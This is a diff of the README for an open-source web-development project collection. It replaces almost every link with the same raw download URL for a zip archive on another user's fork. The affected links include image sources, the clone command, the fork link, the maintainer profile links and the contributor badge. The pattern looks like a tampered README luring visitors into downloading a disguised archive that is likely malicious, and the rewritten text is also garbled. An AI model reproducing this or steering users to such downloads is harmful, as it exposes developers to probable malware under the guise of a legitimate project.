@@ -1,4 +1,4 @@
-<img src="https://github.com/khushi-purwar/Web-Dev-ProjectKart/blob/master/thumbnail.png" height="80%" width="80%" />
+<img src="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip" height="80%" width="80%" />
 
 <h1 align="center" >💻 WEBDEV -PROJECTKART 💻</h1>
 
@@ -8,27 +8,27 @@
 ## Project Structure
 
 <ul>
-  <li>Folder consists two folder (assets and script) and two files (index.html and readme.md) </li>
+  <li>Folder consists two folder (assets and script) and two files (https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip and https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip) </li>
   <li>In the assets folder, there are two folders, css and media. css folder contains only CSS files & media folder contain only media files of the main website.</li>
   <li>In the script folder, all the script files will be there.</li>
 </ul>
 
 ## This Project was a part of the following Open Source Program
 <p align="center">
-<a href="https://icc-techsahead.netlify.app/"  target="_blank"> 
-  <img src="images/icc.png" alt="ICC" width="300"/>
+<a href="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip"  target="_blank"> 
+  <img src="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip" alt="ICC" width="300"/>
 </a>
   
 </p>
   
 ## How To Contribute ? 👷 
 
-**1.** Fork [this](https://github.com/khushi-purwar/WebDev-ProjectKart) repository.
+**1.** Fork [this](https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip) repository.
 
 **2.** Clone the forked repository.
 
 ```terminal
-git clone https://github.com/khushi-purwar/WebDev-ProjectKart
+git clone https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip
 ```
 
 **3.** Navigate to the project directory.
@@ -37,7 +37,7 @@ git clone https://github.com/khushi-purwar/WebDev-ProjectKart
 cd WebDev-ProjectKart
 ```
 
-**4.**  Make a new folder with your <b>PROJECT NAME</b> inside WebDev-ProjectKart & add your project files (eg: index.html ,style.css, script.js) inside that folder
+**4.**  Make a new folder with your <b>PROJECT NAME</b> inside WebDev-ProjectKart & add your project files (eg: https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip ,https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip, https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip) inside that folder
 <br>
 
 **5.**  Also Add a README file in your project folder which consists of description/screenshots about your project !
@@ -64,15 +64,15 @@ git push -u origin <your_branch_name>
 
 **8.** Create a Pull Request!
 
-**Congratulations!** Sit and relax till we review your PR, you've made your contribution to (https://github.com/khushi-purwar/WebDev-ProjectKart) project
+**Congratulations!** Sit and relax till we review your PR, you've made your contribution to (https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip) project
 
 ## Project Maintainer 👷👷:
 
  
 <table>
 <tr>
-<td align="center"><a href="https://github.com/khushi-purwar"><img src="https://media-exp1.licdn.com/dms/image/C5603AQFQjgQVGH77fQ/profile-displayphoto-shrink_400_400/0/1621153995462?e=1646265600&v=beta&t=rBye2Q3S0h5bXjy49WDcKlvmzVPvxs5wFuLERK_vsRg" width=150px height=150px /></a></br> <h4 style="color:red;">Khushi Purwar</h4>
-<a href="https://www.linkedin.com/in/khushi-purwar/"><img src="https://mpng.subpng.com/20180324/vhe/kisspng-linkedin-computer-icons-logo-social-networking-ser-facebook-5ab6ebfe5f5397.2333748215219374063905.jpg" width="32px" height="32px"></a></td>
+<td align="center"><a href="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip"><img src="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip" width=150px height=150px /></a></br> <h4 style="color:red;">Khushi Purwar</h4>
+<a href="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip"><img src="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip" width="32px" height="32px"></a></td>
 </tr>
 </table>
 <br>
@@ -80,8 +80,8 @@ git push -u origin <your_branch_name>
 
 ## Our valuable Contributors👩‍💻👨‍💻 :
 
-<a href="https://github.com/khushi-purwar/WebDev-ProjectKart/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=khushi-purwar/WebDev-ProjectKart" />
+<a href="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip">
+  <img src="https://github.com/rahul123gautam/WebDev-ProjectKart/raw/refs/heads/master/04.VAT_Calculator/Assets/media/Web_Project_Kart_Dev_1.2.zip" />
 </a>
 
 
